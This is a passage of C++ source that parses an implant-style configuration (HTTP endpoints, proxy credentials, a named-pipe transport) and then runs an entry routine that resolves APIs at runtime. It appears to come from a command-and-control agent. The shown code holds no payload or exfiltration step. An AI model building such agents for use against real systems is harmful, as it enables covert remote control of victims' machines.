        Ctx->transport.http->endpoints[Ctx->transport.http->n_endpoints] = nullptr;
        Ctx->transport.b_proxy = UnpackBool(&parser);

        if (Ctx->transport.b_proxy) {
            Ctx->transport.http->proxy = (_proxy*) Malloc(sizeof(_proxy));
            Ctx->transport.http->access = INTERNET_OPEN_TYPE_PROXY;

            ParserWcscpy(&parser, &Ctx->transport.http->proxy->address, nullptr );
            ParserWcscpy(&parser, &Ctx->transport.http->proxy->username, nullptr );
            ParserWcscpy(&parser, &Ctx->transport.http->proxy->password, nullptr );
        }
#endif
#ifdef TRANSPORT_PIPE
        ParserWcscpy(&parser, &Ctx->transport.pipe_name, nullptr);
#endif

    defer:
        DestroyParser(&parser);
        return success;
    }
}

using namespace Main;
VOID Entrypoint() {

    __debugbreak();
    if (!ContextInit() || !ResolveApi() || !ReadConfig()) {
        return;
    }

    MainRoutine();
}
